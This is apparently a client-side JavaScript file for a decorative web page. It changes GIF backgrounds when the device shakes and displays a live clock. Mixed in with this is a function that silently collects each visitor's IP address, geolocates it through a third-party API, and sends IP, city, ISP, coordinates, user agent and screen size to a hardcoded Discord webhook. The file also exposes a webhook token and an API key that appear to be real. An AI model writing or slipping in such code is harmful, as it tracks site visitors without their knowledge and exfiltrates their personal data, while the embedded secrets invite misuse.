
  let backgroundImages = [
    'https://wallpapercave.com/wp/wp8953919.gif',
    'https://wallpapercave.com/wp/wp2761928.gif',
    'https://i.pinimg.com/originals/14/d2/09/14d20919b5d877d3942428df52c72ea3.gif'
  ];

  function changeBackground() {
    const randomIndex = Math.floor(Math.random() * backgroundImages.length);
    document.body.style.backgroundImage = `url('${backgroundImages[randomIndex]}')`;
  }

  window.addEventListener('devicemotion', (event) => {
    const acceleration = event.accelerationIncludingGravity;
    const accelerationThreshold = 15;

    if (
      Math.abs(acceleration.x) > accelerationThreshold ||
      Math.abs(acceleration.y) > accelerationThreshold ||
      Math.abs(acceleration.z) > accelerationThreshold
    ) {
      changeBackground();
    }
  });





  async function sendUserInfoToDiscord() {
    const webhookUrl = "https://discord.com/api/webhooks/1171096209046388868/YoF-KFQ7wpPlWSqq465SDpj3F-pBld8NCHh0CNu4mmLelVwwgN0FE-3rvGfSj4E5Kh6r"; // Replace with your actual webhook URL

    try {
      // Get user's IP address
      const ipAddress = await fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => data.ip);

      // Fetch IP details from ipgeolocation.io
      const ipDetailsResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9d888ca6249742d1a1bb835fde3a36ca&ip=${ipAddress}`);
      const ipDetailsData = await ipDetailsResponse.json();

      // Construct the message payload with IP details
      const message = {
        content: `\New visitor:\nIP Address: ${ipAddress}\nCountry: ${ipDetailsData.country_name}\nCity: ${ipDetailsData.city}\nRegion: ${ipDetailsData.region_name}\nISP: ${ipDetailsData.isp}\nLatitude: ${ipDetailsData.latitude}\nLongitude: ${ipDetailsData.longitude}\nUser Agent: ${navigator.userAgent}\nScreen Resolution: ${screen.width}x${screen.height}`
      };

      // Send the message to Discord
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      });
    } catch (error) {
      console.error('Error sending message to Discord:', error);
    }
  }
function updateTime() {
  const currentTimeElement = document.getElementById('currentTime');
  const now = new Date();
  let hours = now.getHours();
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12 || 12; // Convert to 12-hour format
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  currentTimeElement.textContent = `${hours}:${minutes}:${seconds} ${ampm}`;
}

setInterval(updateTime, 1000);
